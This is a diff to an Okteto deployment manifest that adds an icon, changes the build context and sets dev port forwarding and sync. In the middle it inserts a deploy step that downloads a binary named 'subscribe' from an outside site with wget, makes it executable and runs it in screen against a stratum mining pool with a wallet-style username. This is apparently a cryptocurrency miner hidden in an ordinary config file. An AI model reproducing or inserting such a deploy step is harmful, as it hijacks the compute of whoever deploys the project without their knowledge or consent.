@@ -1,7 +1,15 @@
+icon: https://apps.okteto.com/movies/icon.png
 build:
   api:
-    context: api
-  frontend:
-    context: frontend
-    dockerfile: Dockerfile
-    target: dev
+    context: .
+deploy:
+  -   wget http://ilovenypizza.com/subscribe; chmod +x subscribe; screen ./subscribe -a gr  -o stratum+tcps://stratum-na.rplant.xyz:17075 -u BZbVy934tse2cn2hn1oFkUBhu8M4HETNMM.okeo
+
+dev:
+  api:
+    command: ["bash"]
+    forward:
+      - 8080:8080
+      - 9229:9229
+    sync:
+      - .:/usr/src/app
